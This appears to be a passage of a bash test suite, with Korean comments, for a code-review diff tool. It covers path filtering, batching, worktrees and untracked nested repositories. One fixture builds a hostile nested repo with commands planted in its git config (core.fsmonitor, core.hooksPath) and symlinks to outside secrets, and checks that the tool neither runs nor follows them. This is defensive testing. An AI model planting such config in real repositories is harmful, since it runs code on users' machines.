  assert_file_absent "$D/review-i1.doc-paths" "^exclude${TAB}README\\.md\$" "큰 제외 목록: exclude<TAB>README.md 없음"
  assert_eq "$(grep -c "^reviewed${TAB}" "$D/review-i1.doc-paths")" 1 "큰 제외 목록: reviewed 줄은 하나"
  assert_eq "$(field filtered_files "$OUT")" 2 "큰 제외 목록: filtered_files: 2"
  assert_file_absent "$D/review-i1.diff" 'notes/n-' "큰 제외 목록: 문서는 걸러진 diff 에 없다"
  # 음의 짝 — 접두가 아닌 제외 경로(CHANGELOG.md)는 그대로 빠지고 알리지 않는다.
  mkfix
  echo 'new' > "$R/CHANGELOG.md"; echo 'x = 2' > "$R/src/a.py"; g "$R" add -A; g "$R" commit -q -m c
  rd --mode branch
  assert_eq "$(field excluded "$OUT")" 1 "음의 짝: excluded: 1"
  assert_file_absent "$D/review-i1.diff" 'CHANGELOG' "음의 짝: CHANGELOG.md 는 빠진다"
  assert_file_absent "$ROOT/err" 'CHANGELOG' "음의 짝: 알리는 줄 없음"
}

# 이름 대조 — 걸러진 diff 의 이름 목록이 남길 경로 하나를 빠뜨리면 degraded: yes 와 그 경로(AC20).
# git 대역: 남길 경로를 pathspec 매직으로 넘긴 --name-only 호출의 출력에서 src/a.py 를 지운다.
case_name_reconcile_catches_missing() {
  echo "[이름 대조 — 걸러진 이름 목록에서 빠진 경로를 잡는다]"
  mkfix
  local real shim="$ROOT/shim-git"
  real="$(command -v git)"
  mkdir -p "$shim"
  {
    printf '#!/bin/bash\n'
    printf 'real=%q\n' "$real"
    printf '%s\n' 'no=0 magic=0' \
      'for a in "$@"; do case "$a" in --name-only) no=1 ;; ":("*) magic=1 ;; esac; done' \
      'if [ "$no" = 1 ] && [ "$magic" = 1 ]; then' \
      '  "$real" "$@" > "$0.out"; rc=$?' \
      '  while IFS= read -r -d "" x; do [ "$x" = src/a.py ] || printf "%s\0" "$x"; done < "$0.out"' \
      '  exit "$rc"' \
      'fi' \
      'exec "$real" "$@"'
  } > "$shim/git"
  chmod +x "$shim/git"
  echo "# changed" > "$R/README.md"; echo 'x = 2' > "$R/src/a.py"; echo 'y = 2' > "$R/lib/b.py"
  OUT=$(cd "$R" && PATH="$shim:$PATH" bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "빠진 경로가 있으면 degraded: yes"
  assert_file_grep "$ROOT/err" '^review-diff: 바뀐 경로 src/a\.py ' "빠진 경로를 stderr 에 크게 알린다"
  assert_file_absent "$ROOT/err" 'lib/b\.py' "실린 경로는 알리지 않는다"
  assert_file_absent "$ROOT/err" 'README' "제외한 경로는 알리지 않는다"
  # 양성 짝 — 대역 없이는 degraded 가 아니다.
  rd --mode session
  assert_eq "$(field degraded "$OUT")" no "양성 짝: 대역 없이 degraded: no"
  assert_file_absent "$ROOT/err" '바뀐 경로' "양성 짝: 알리는 줄 없음"
}

# 바뀐 경로가 전부 제외되면 남길 경로가 0 — 경로 없이 git diff 를 불러 전체 diff 를 내지 않는다.
case_all_excluded_no_pathspec() {
  echo "[전부 제외 — 걸러진 diff 는 비고 전체 diff 가 아니다]"
  local mode
  for mode in branch session; do
    mkfix
    echo "# changed" > "$R/README.md"; echo 'new' > "$R/CHANGELOG.md"
    g "$R" add -A
    [ "$mode" = branch ] && g "$R" commit -q -m docs
    rd --mode "$mode"
    assert_eq "$RC" 0 "$mode: rc 0"
    assert_eq "$(field files "$OUT")" 2 "$mode: files: 2"
    assert_eq "$(field excluded "$OUT")" 2 "$mode: excluded: 2"
    assert_eq "$(field filtered_files "$OUT")" 0 "$mode: filtered_files: 0"
    assert_eq "$(field degraded "$OUT")" no "$mode: degraded: no"
    [ -f "$D/review-i1.diff" ] && [ ! -s "$D/review-i1.diff" ] \
      && ok "$mode: review-i1.diff 크기 0" || no "$mode: review-i1.diff 가 없거나 비지 않았다"
    [ -s "$D/review-i1.full.diff" ] && ok "$mode: 양성 짝 — full.diff 는 비지 않았다" \
      || no "$mode: full.diff 가 비었다"
  done
}

# worktree 건너뛰기는 이 세션에 묶인다(AC21) — 세션 폴더 이름의 앞 8자가 (base|head)-<8자> 와 같을 때만.
# 다른 세션 접미의 등록 worktree 는 리뷰하지 않고 이유와 함께 알린다(degraded: yes).
case_other_session_worktree_degraded() {
  echo "[다른 세션의 qg worktree — 건너뛰지 않고 이유와 함께 알린다]"
  mkfix
  local S="$R/.claude/quality-gates/sessAAAA0000" wa wb
  mkdir -p "$S"
  wb=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" sessBBBB0000 2>/dev/null)
  [ -n "$wb" ] && [ -d "$wb" ] && ok "다른 세션 트리를 만들었다" || no "다른 세션 트리를 만들지 못했다"
  echo 'new = 1' > "$R/new.py"
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "다른 세션 트리가 있으면 degraded: yes"
  assert_line "$ROOT/err" "$(stale_line "$R" base-sessBBBB)" "이유 줄 — 이전 qg 실행 · 지우는 명령"
  assert_file_absent "$ROOT/err" '중첩 레포' "중첩 레포 줄로 알리지 않는다"
  assert_file_absent "$S/review-i1.self-state" 'base-sessBBBB' "다른 세션 트리는 self_state 에 없다"
  assert_file_grep "$S/review-i1.names" '^\.claude/quality-gates/worktrees/base-sessBBBB/$' "names 에 다른 세션 트리"
  assert_eq "$(field self_state "$OUT")" 0 "self_state: 0"
  # 알린 명령이 실제로 그 트리를 지운다(절대 경로 — 레포 안 어느 폴더에서 돌려도 같다).
  local cmd; cmd=$(sed -n 's/^.* 쓰고 있지 않으면 \(git worktree remove --force .*\) 로 지운 뒤 다시 돌려라$/\1/p' "$ROOT/err")
  ( cd "$R/src" && eval "$cmd" ) >/dev/null 2>&1 && [ ! -d "$wb" ] \
    && ok "알린 git worktree remove 명령이 그 트리를 지운다" || no "알린 명령으로 트리를 지우지 못했다: $cmd"
  # 양성 짝 — 이 세션 접미의 트리는 지금처럼 건너뛴다.
  rm -rf -- "$S"/review-i1.*
  [ ! -d "$wb" ] || g "$R" worktree remove --force --force "$wb"
  wa=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" sessAAAA0000 2>/dev/null)
  [ -n "$wa" ] && [ -d "$wa" ] && ok "이 세션 트리를 만들었다" || no "이 세션 트리를 만들지 못했다"
  rdd "$S" --mode session
  assert_eq "$(field degraded "$OUT")" no "양성 짝: degraded: no"
  assert_eq "$(field self_state "$OUT")" 1 "양성 짝: self_state: 1"
  assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-sessAAAA/$' "양성 짝: 이 세션 트리는 건너뛴다"
  assert_file_absent "$ROOT/err" 'worktree' "양성 짝: 알리는 줄 없음"
  # 세션 폴더 이름이 8자 미만이면 건너뛰기 없음 — 이 세션 트리도 리뷰하지 않은 항목으로 알린다.
  local S2="$R/.claude/quality-gates/sessAAA"; mkdir -p "$S2"
  rdd "$S2" --mode session
  assert_eq "$(field self_state "$OUT")" 0 "8자 미만 세션 폴더: self_state: 0"
  assert_eq "$(field degraded "$OUT")" yes "8자 미만 세션 폴더: degraded: yes"
  assert_line "$ROOT/err" "$(stale_line "$R" base-sessAAAA)" "8자 미만 세션 폴더: 이 세션 트리도 이유 줄로 알린다"
}

# 걸러진 diff 는 남길 경로를 묶음으로 나눠 부른다(인자 길이 상한). 묶음을 이어도 빠지거나 겹치는 경로가 없다.
# 경로 수 묶음: m(지운 파일) · m-000…m-509 · m/x.py — 정렬 순서로 m 과 m/x.py 가 다른 묶음에 든다.
# :(literal)m 은 m/x.py 도 잡으므로 m/x.py 를 따로 넘기면 두 번 나온다.
case_keep_batches() {
  echo "[남길 경로 묶음 — 수 · 글자 상한으로 나눠도 빠짐 · 겹침 없음]"
  mkfix
  echo 'm = 1' > "$A/m"; g "$A" add m; g "$A" commit -q -m m
  git -C "$R" fetch -q origin; g "$R" checkout -q -B feature origin/trunk
  g "$R" rm -q m
  mkdir -p "$R/m"; echo 'mx_marker = 1' > "$R/m/x.py"
  local i
  for i in $(seq -w 0 509); do echo "v = $i" > "$R/m-$i"; done
  g "$R" add -A; g "$R" commit -q -m many
  rd --mode branch
  assert_eq "$RC" 0 "수 묶음: rc 0"
  assert_eq "$(field files "$OUT")" 512 "수 묶음: files: 512"
  assert_eq "$(field filtered_files "$OUT")" 512 "수 묶음: filtered_files: 512 (겹침 없음)"
  assert_eq "$(field degraded "$OUT")" no "수 묶음: degraded: no"
  assert_eq "$(grep -c '^+++ b/m-' "$D/review-i1.diff")" 510 "수 묶음: m-NNN 510개가 모두 걸러진 diff 에"
  assert_eq "$(grep -c '^+++ b/m/x\.py$' "$D/review-i1.diff")" 1 "수 묶음: m/x.py 는 한 번"
  assert_eq "$(grep -c '^--- a/m$' "$D/review-i1.diff")" 1 "수 묶음: 지운 m 은 한 번"
  assert_eq "$(grep -c '^diff --git ' "$D/review-i1.diff")" 512 "수 묶음: diff 머리 512개"
  # 글자 수 묶음 — 인자 글자 합이 100000 을 넘는 git diff 호출을 거부하는 대역(좁은 ARG_MAX)으로 잰다.
  mkfix
  local long="L/$(printf 'a%.0s' $(seq 200))/$(printf 'b%.0s' $(seq 200))/$(printf 'c%.0s' $(seq 200))"
  mkdir -p "$R/$long"
  for i in $(seq -w 0 159); do echo "w = $i" > "$R/$long/f-$i-$(printf 'd%.0s' $(seq 80)).py"; done
  g "$R" add -A; g "$R" commit -q -m long
  local real shim="$ROOT/shim-argmax"
  real="$(command -v git)"
  mkdir -p "$shim"
  {
    printf '#!/bin/bash\n'
    printf 'real=%q\n' "$real"
    printf '%s\n' 'n=0' \
      'for a in "$@"; do case "$a" in ":("*) n=$((n + ${#a} + 1)) ;; esac; done' \
      'if [ "$n" -gt 100000 ]; then echo "shim: argument list too long ($n)" >&2; exit 126; fi' \
      'exec "$real" "$@"'
  } > "$shim/git"
  chmod +x "$shim/git"
  OUT=$(cd "$R" && PATH="$shim:$PATH" bash "$RDIFF" --dir "$D" --iter 1 --mode branch 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "글자 묶음: 좁은 인자 상한 대역에서도 rc 0"
  assert_eq "$(field filtered_files "$OUT")" 160 "글자 묶음: filtered_files: 160"
  assert_eq "$(field degraded "$OUT")" no "글자 묶음: degraded: no"
  assert_eq "$(grep -c '^+++ b/L/' "$D/review-i1.diff")" 160 "글자 묶음: 160개가 모두 걸러진 diff 에"
}

# MDX 는 코드를 실행한다 — 문서 경로 패턴(README*)에 걸려도 빠지지 않고 kept 로 이름이 난다.
case_mdx_reviewed_as_code() {
  echo "[README.mdx 는 코드로 리뷰 · README.md 는 뺀다]"
  mkfix
  echo 'export const x = 1' > "$R/README.mdx"
  echo "# changed" > "$R/README.md"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field excluded "$OUT")" 1 "excluded: 1 (README.md 만)"
  assert_eq "$(field kept_model "$OUT")" 1 "kept_model: 1 (README.mdx)"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/README\.mdx$' "걸러진 diff 에 README.mdx 가 남는다"
  assert_file_absent "$D/review-i1.diff" '^\+\+\+ b/README\.md$' "걸러진 diff 에 README.md 는 없다"
  assert_file_grep "$D/review-i1.doc-paths" "^kept${TAB}README\.mdx\$" "doc-paths 에 'kept<TAB>README.mdx'"
  assert_file_grep "$D/review-i1.doc-paths" "^exclude${TAB}README\.md\$" "doc-paths 에 'exclude<TAB>README.md'"
}

# 추적 안 되는 중첩 레포 안의 중첩 레포(ls-files 가 폴더 한 줄로 낸다)는 리뷰하지 않는다 — 그 안에서 git 을
# 돌리지도, 그 안의 파일을 읽지도 않고, 폴더마다 이스케이프한 이름으로 크게 알린다. 바깥 중첩 레포의 다른
# 파일은 리뷰한다.
case_nested_repo_disclosed() {
  echo "[중첩 레포 안의 중첩 레포 — 리뷰하지 않고 크게 알린다]"
  mkfix
  local N="$R/vendor/lib"; mkdir -p "$N"
  git init -q -b trunk "$N"
  echo 'nested_marker_a = 1' > "$N/a.py"; g "$N" add a.py; g "$N" commit -q -m n
  echo 'nested_marker_b = 1' > "$N/b.py"
  local H="$R/h"; git init -q -b trunk "$H"; echo 'holder_marker = 1' > "$H/top.py"
  local inl="$N/inl"; git init -q -b trunk "$inl"; echo 'inner_marker_g = 1' > "$inl/g.py"
  local odd="$H/odd
name" esc; esc="$H/esc$(printf '\033')x"
  git init -q -b trunk "$odd"; echo 'inner_marker_c = 1' > "$odd/c.py"
  git init -q -b trunk "$esc"; echo 'inner_marker_d = 1' > "$esc/d.py"
  local tick="$H/tick\`\`x" ticktab; ticktab="$H/a\`\`b$(printf '\t')c"
  git init -q -b trunk "$tick"; echo 'inner_marker_e = 1' > "$tick/e.py"
  git init -q -b trunk "$ticktab"; echo 'inner_marker_f = 1' > "$ticktab/f.py"
  echo 'new = 1' > "$R/new.py"
  local fsm; fsm=$(mktemp -d "$ROOT/fsm.XXXXXX")
  printf '#!/bin/sh\ntouch "%s/RAN"\nexit 1\n' "$fsm" > "$fsm/hook.sh"; chmod +x "$fsm/hook.sh"
  git -C "$N" config core.fsmonitor "$fsm/hook.sh"; git -C "$inl" config core.fsmonitor "$fsm/hook.sh"
  git -C "$odd" config core.fsmonitor "$fsm/hook.sh"
  rd --mode session
  [ ! -e "$fsm/RAN" ] && ok "중첩 레포의 core.fsmonitor 가 돌지 않았다" || no "중첩 레포의 core.fsmonitor 가 돌았다"
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes (리뷰하지 못한 항목 — 인증을 막는다)"
  assert_eq "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')" 10 "stdout 10줄"
  assert_eq "$(field files "$OUT")" 9 "files: 9 (new.py + 바깥 중첩 레포 파일 셋 + 안의 중첩 레포 폴더 줄 다섯)"
  assert_eq "$(field filtered_files "$OUT")" 4 "filtered_files: 4 (new.py · vendor/lib/a.py · b.py · h/top.py)"
  assert_file_grep "$D/review-i1.names" '^vendor/lib/inl/$' "names 에 폴더 줄 vendor/lib/inl/"
  assert_file_absent "$D/review-i1.names" '^vendor/lib/inl/.' "안의 중첩 레포 파일을 names 에 펼치지 않는다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_marker_a = 1$' "바깥 중첩 레포가 커밋한 파일을 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_marker_b = 1$' "바깥 중첩 레포의 추적 안 된 파일을 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+holder_marker = 1$' "이름이 이상한 안의 레포를 담은 레포의 파일도 리뷰한다"
  assert_file_absent "$D/review-i1.full.diff" 'inner_marker' "안의 중첩 레포 글이 full.diff 에 없다"
  assert_file_absent "$D/review-i1.diff" 'inner_marker' "안의 중첩 레포 글이 걸러진 diff 에 없다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/new\.py$' "다른 파일은 그대로 리뷰한다"
  assert_eq "$(grep -c "$NESTED_TAIL" "$ROOT/err")" 5 "폴더마다 크게 알리는 줄 하나"
  grep -qF "중첩 레포 \$'h/tick\\x60\\x60x/' " "$ROOT/err" && ok "백틱 든 이름은 백틱을 \\x60 으로 바꿔 알린다" \
    || no "백틱 든 이름을 \\x60 으로 바꾸지 않았다"
  grep -qF "중첩 레포 \$'h/a\\x60\\x60b\\tc/' " "$ROOT/err" && ok "백틱과 탭이 함께 든 이름도 백틱을 \\x60 으로 바꿔 알린다" \
    || no "백틱과 탭이 함께 든 이름의 백틱이 남았다"
  assert_eq "$(grep "$NESTED_TAIL" "$ROOT/err" | grep -c '`')" 0 "알리는 줄에 백틱이 하나도 없다(코드 스팬을 닫지 못한다)"
  assert_file_grep "$ROOT/err" "^review-diff: 추적 안 되는 중첩 레포 vendor/lib/inl/ ${NESTED_TAIL}\$" "vendor/lib/inl/ 를 알린다"
  grep -qF "중첩 레포 \$'h/odd\\nname/' " "$ROOT/err" \
    && ok "줄바꿈 든 이름은 이스케이프해 한 줄로 알린다" || no "줄바꿈 든 이름을 이스케이프하지 않았다"
  assert_eq "$(grep -c '^name/' "$ROOT/err")" 0 "날 줄바꿈이 stderr 에 새지 않는다"
  assert_eq "$(grep -c "$(printf '\033')" "$ROOT/err")" 0 "날 제어 문자가 stderr 에 새지 않는다"
  grep -qF "중첩 레포 \$'h/esc\\Ex/' " "$ROOT/err" \
    && ok "제어 문자 든 이름은 이스케이프해 알린다" || no "제어 문자 든 이름을 이스케이프하지 않았다"
}

# 적대 중첩 레포 — 그 레포의 .git/config 에 명령(core.fsmonitor · core.hooksPath)을 심고, 레포 밖 비밀을
# 가리키는 링크(파일 · 폴더)를 둔다. 마커 · 비밀은 레포 밖 임시 폴더에 둔다.
mk_hostile_nested() {   # mk_hostile_nested <중첩 레포 폴더> <마커 폴더> <비밀 폴더>
  local N="$1" M="$2" X="$3" h
  mkdir -p "$N/src" "$N/node_modules" "$M/hooks" "$X/sdir"
  echo 'SECRET-R12' > "$X/secret.txt"; echo 'SECRET-R12' > "$X/sdir/s.txt"
  git init -q -b trunk "$N"
  printf 'node_modules/\n' > "$N/.gitignore"
  echo 'nested_tracked_marker = 1' > "$N/t.py"
  g "$N" add t.py .gitignore; g "$N" commit -q -m n
  echo 'nested_src_marker = 1' > "$N/src/a.py"
  echo 'nested_dep_marker = 1' > "$N/node_modules/x.js"
  echo 'nested_infoex_marker = 1' > "$N/infoex.py"
  mkdir -p "$N/.git/info"; echo 'infoex.py' >> "$N/.git/info/exclude"
  ln -s "$X/secret.txt" "$N/link-out"
  ln -s "$X/sdir" "$N/dlink-out"
  printf '#!/bin/sh\ntouch "%s/FSMONITOR-FIRED"\nexit 1\n' "$M" > "$M/fsm.sh"; chmod +x "$M/fsm.sh"
  for h in pre-commit post-checkout post-index-change reference-transaction; do
    printf '#!/bin/sh\ntouch "%s/HOOK-FIRED"\n' "$M" > "$M/hooks/$h"; chmod +x "$M/hooks/$h"
  done
  git -C "$N" config core.fsmonitor "$M/fsm.sh"
  git -C "$N" config core.hooksPath "$M/hooks"
}

# 추적 안 되는 중첩 레포는 그 레포의 설정 · 훅 없이 그 레포 · 사용자의 무시 규칙대로 파일 목록을 얻어
# 리뷰한다(AC22). 링크는 링크 자체만 싣는다. 그 안의 중첩 레포(sub/inner/)는 리뷰하지 않고 알린다.
NESTED_SAID='안 파일'
nested_said() {   # nested_said <이름> <수> — 펼친 중첩 레포를 알리는 줄
  printf 'review-diff: 추적 안 되는 중첩 레포 %s 안 파일 %s개를 그 레포의 무시 규칙대로 리뷰에 실었다' "$1" "$2"
}
case_nested_repo_reviewed_safely() {
  echo "[추적 안 되는 중첩 레포 — 설정 · 링크 없이 무시 규칙대로 리뷰한다]"
  mkfix
  local M X C
  M=$(mktemp -d "$ROOT/mark.XXXXXX"); X=$(mktemp -d "$ROOT/secret.XXXXXX"); C=$(mktemp -d "$ROOT/ctl.XXXXXX")
  # 양성 대조 — 같은 픽스처에서 보호 없는 git status 는 심은 core.fsmonitor 를, commit 은 심은 훅을 돌린다
  # (이 픽스처가 실제로 위험하다).
  mk_hostile_nested "$C/sub" "$C/mark" "$C/secret"
  ( cd "$C/sub" && git status --porcelain ) >/dev/null 2>&1
  [ -e "$C/mark/FSMONITOR-FIRED" ] && ok "양성 대조: 보호 없는 git status 는 심은 core.fsmonitor 를 돌린다" \
    || no "양성 대조: 픽스처의 core.fsmonitor 가 돌지 않았다 — 픽스처가 위험하지 않다"
  g "$C/sub" commit -q --allow-empty -m h >/dev/null 2>&1
  [ -e "$C/mark/HOOK-FIRED" ] && ok "양성 대조: 보호 없는 git commit 은 심은 훅을 돌린다" \
    || no "양성 대조: 픽스처의 훅이 돌지 않았다 — 훅 마커 단언이 공허하다"
  mk_hostile_nested "$R/sub" "$M" "$X"
  echo 'readme' > "$R/sub/README.md"
  local nl="$R/sub/nl
f.py"
  echo 'nested_nl_marker = 1' > "$nl"
  ln -s "$X/sdir" "$R/sub/d q\"l"
  git init -q -b trunk "$R/sub/inner"; echo 'inner_marker = 1' > "$R/sub/inner/b.py"
  echo 'new = 1' > "$R/new.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  [ ! -e "$M/FSMONITOR-FIRED" ] && ok "중첩 레포의 core.fsmonitor 가 돌지 않았다" || no "중첩 레포의 core.fsmonitor 가 돌았다"
  [ ! -e "$M/HOOK-FIRED" ] && ok "중첩 레포의 훅이 돌지 않았다" || no "중첩 레포의 훅이 돌았다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/sub/src/a\.py$' "sub/src/a.py 를 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_src_marker = 1$' "sub/src/a.py 의 글이 diff 에 있다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_tracked_marker = 1$' "중첩 레포가 커밋한 파일을 리뷰한다"
  assert_file_absent "$D/review-i1.full.diff" 'nested_infoex_marker' "중첩 레포의 .git/info/exclude 가 숨긴 파일은 없다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/sub/\.gitignore$' "sub/.gitignore 를 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_nl_marker = 1$' "줄바꿈 든 이름의 파일도 리뷰한다"
  assert_file_absent "$D/review-i1.full.diff" 'node_modules/x\.js|nested_dep_marker' "중첩 레포의 .gitignore 가 뺀 파일은 없다"
  assert_file_absent "$D/review-i1.full.diff" 'SECRET-R12' "레포 밖 비밀이 full.diff 에 없다(링크를 따라가지 않았다)"
  assert_file_absent "$D/review-i1.diff" 'SECRET-R12' "레포 밖 비밀이 diff 에 없다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/sub/link-out$' "파일 링크는 링크 자체로 싣는다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/sub/dlink-out$' "폴더 링크는 링크 자체로 싣는다"
  assert_line "$D/review-i1.diff" 'diff --git "a/sub/d q\"l" "b/sub/d q\"l"' "따옴표 든 폴더 링크 이름은 git 꼴로 감싼다"
  assert_eq "$(grep -c '^new file mode 120000$' "$D/review-i1.diff")" 3 "링크 셋 모두 mode 120000"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/sub/README\.md$' "중첩 레포의 문서도 full.diff 에 있다"
  assert_file_grep "$D/review-i1.doc-paths" "^exclude${TAB}sub/README\\.md\$" "중첩 레포의 문서도 문서 경로 규칙을 따른다"
  assert_file_grep "$D/review-i1.names" '^sub/src/a\.py$' "names 에 sub/src/a.py"
  assert_file_grep "$D/review-i1.names" '^sub/inner/$' "names 에 sub/inner/ 폴더 줄"
  assert_file_absent "$D/review-i1.names" '^sub/$' "펼친 중첩 레포의 폴더 줄은 names 에 없다"
  assert_file_absent "$D/review-i1.full.diff" 'inner_marker' "중첩 레포 안의 중첩 레포 글은 없다"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 sub/inner/ ${NESTED_TAIL}" "sub/inner/ 를 리뷰하지 않았다고 알린다"
  assert_eq "$(grep -c '리뷰하지 않았다' "$ROOT/err")" 1 "리뷰하지 않았다는 줄은 sub/inner/ 하나"
  assert_line "$ROOT/err" "$(nested_said sub/ 8)" "펼친 중첩 레포와 실은 파일 수를 알린다"
  assert_file_absent "$ROOT/err" '들지 못해' "이름 대조에서 빠진 경로가 없다"
  assert_eq "$(field degraded "$OUT")" yes "sub/inner/ 가 있으면 degraded: yes"
  assert_eq "$(field files "$OUT")" 10 "files: 10 (new.py + 중첩 레포 파일 여덟 + sub/inner/)"
  # 사용자 무시 규칙 — 전역 core.excludesFile 이 있으면 그것을, 없으면 XDG git/ignore 를 지킨다(git 과 같다).
  local GH; GH=$(mktemp -d "$ROOT/home.XXXXXX")
  mkdir -p "$GH/xdg/git"
  printf 'gex.py\n' > "$GH/gexcl"; printf '[core]\n\texcludesFile = %s\n' "$GH/gexcl" > "$GH/gitconfig"
  : > "$GH/emptyconfig"
  printf 'xdg.py\n' > "$GH/xdg/git/ignore"
  echo 'nested_gex_marker = 1' > "$R/sub/gex.py"; echo 'nested_xdg_marker = 1' > "$R/sub/xdg.py"
  rm -rf -- "$R/sub/inner"
  : > "$R/sub/.git/info/exclude"
  # 양성 대조 둘 — 그 규칙이 바로 그 파일을 숨긴다.
  local plain
  git init -q --bare "$GH/none.git"
  plain=$(cd "$R/sub" && GIT_DIR="$GH/none.git" GIT_WORK_TREE="$R/sub" GIT_CONFIG_NOSYSTEM=1 \
    GIT_CONFIG_GLOBAL="$GH/gitconfig" HOME="$GH" XDG_CONFIG_HOME="$GH/xdg" git ls-files --others --exclude-standard)
  case "$plain" in *gex.py*) no "양성 대조: 전역 core.excludesFile 이 목록에서 파일을 숨기지 않았다" ;;
    *xdg.py*) ok "양성 대조: 전역 core.excludesFile 이 gex.py 를 숨기고 그때 XDG git/ignore 는 쓰이지 않는다" ;;
    *) no "양성 대조: 목록을 얻지 못했다" ;; esac
  plain=$(cd "$R/sub" && GIT_DIR="$GH/none.git" GIT_WORK_TREE="$R/sub" GIT_CONFIG_NOSYSTEM=1 \
    GIT_CONFIG_GLOBAL="$GH/emptyconfig" HOME="$GH" XDG_CONFIG_HOME="$GH/xdg" git ls-files --others --exclude-standard)
  case "$plain" in *xdg.py*) no "양성 대조: XDG git/ignore 가 목록에서 파일을 숨기지 않았다" ;;
    *gex.py*) ok "양성 대조: 전역 excludesFile 이 없으면 XDG git/ignore 가 xdg.py 를 숨긴다" ;;
    *) no "양성 대조: 목록을 얻지 못했다" ;; esac
  rm -f -- "$D"/review-i1.*
  OUT=$(cd "$R" && GIT_CONFIG_GLOBAL="$GH/gitconfig" HOME="$GH" XDG_CONFIG_HOME="$GH/xdg" \
    bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "전역 설정: rc 0"
  assert_file_absent "$D/review-i1.full.diff" 'nested_gex_marker' "사용자 전역 core.excludesFile 이 숨긴 중첩 레포 파일은 없다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_xdg_marker = 1$' "전역 excludesFile 이 있으면 XDG git/ignore 로 숨기지 않는다(git 과 같다)"
  assert_file_grep "$D/review-i1.diff" '^\+nested_infoex_marker = 1$' "양의 짝: .git/info/exclude 를 비우면 그 파일을 리뷰한다"
  # 양의 짝 — 중첩 레포 안의 중첩 레포가 없으면 degraded: no 다.
  assert_eq "$(field degraded "$OUT")" no "sub/inner/ 가 없으면 degraded: no"
  assert_file_absent "$ROOT/err" '리뷰하지 않았다' "리뷰하지 않았다는 줄이 없다"
  rm -f -- "$D"/review-i1.*
  OUT=$(cd "$R" && GIT_CONFIG_GLOBAL="$GH/emptyconfig" HOME="$GH" XDG_CONFIG_HOME="$GH/xdg" \
    bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "XDG: rc 0"
  assert_file_absent "$D/review-i1.full.diff" 'nested_xdg_marker' "XDG git/ignore 가 숨긴 중첩 레포 파일은 없다"
  assert_file_grep "$D/review-i1.diff" '^\+nested_gex_marker = 1$' "양의 짝: 전역 규칙이 없으면 gex.py 를 리뷰한다"
  [ ! -e "$M/FSMONITOR-FIRED" ] && [ ! -e "$M/HOOK-FIRED" ] && ok "뒤 실행들도 심은 명령이 돌지 않았다" \
    || no "뒤 실행에서 심은 명령이 돌았다"
}

# 중첩 레포의 파일 목록을 얻지 못하면 그 레포는 리뷰하지 않고 이유와 함께 알린다.
case_nested_list_failure() {
  echo "[중첩 레포 파일 목록 실패 — 리뷰하지 않고 이유를 알린다]"
  mkfix
  mkdir -p "$R/sub"; git init -q -b trunk "$R/sub"; echo 'nested_marker = 1' > "$R/sub/a.py"
  echo 'new = 1' > "$R/new.py"
  local shim real; shim=$(mktemp -d "$ROOT/gshim.XXXXXX"); real=$(command -v git)
  printf '#!/bin/sh\n[ -n "${GIT_WORK_TREE:-}" ] && exit 128\nexec "%s" "$@"\n' "$real" > "$shim/git"
  chmod +x "$shim/git"
  OUT=$(cd "$R" && PATH="$shim:$PATH" bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 sub/ 는 리뷰하지 않았다 — 무시 규칙을 지켜 파일 목록을 얻지 못했다. .gitignore 에 넣거나 레포 밖으로 옮긴 뒤 다시 돌려라" \
    "목록을 얻지 못한 이유를 알린다"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_file_grep "$D/review-i1.names" '^sub/$' "names 에 폴더 줄 sub/"
  assert_file_absent "$D/review-i1.full.diff" 'nested_marker' "그 안의 글은 diff 에 없다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/new\.py$' "다른 파일은 그대로 리뷰한다"
  # 사용자 전역 core.excludesFile 이 상대 경로면(git 은 그 레포 폴더 기준으로 읽는다 — 레포가 정한 파일)
  # 무시 규칙을 안전하게 지킬 수 없다 — 펼치지 않고 막는다.
  local GB; GB=$(mktemp -d "$ROOT/gbad.XXXXXX"); printf '[core]\n\texcludesFile = rel-ignore\n' > "$GB/gitconfig"
  OUT=$(cd "$R" && GIT_CONFIG_GLOBAL="$GB/gitconfig" bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "상대 경로 excludesFile: rc 0"
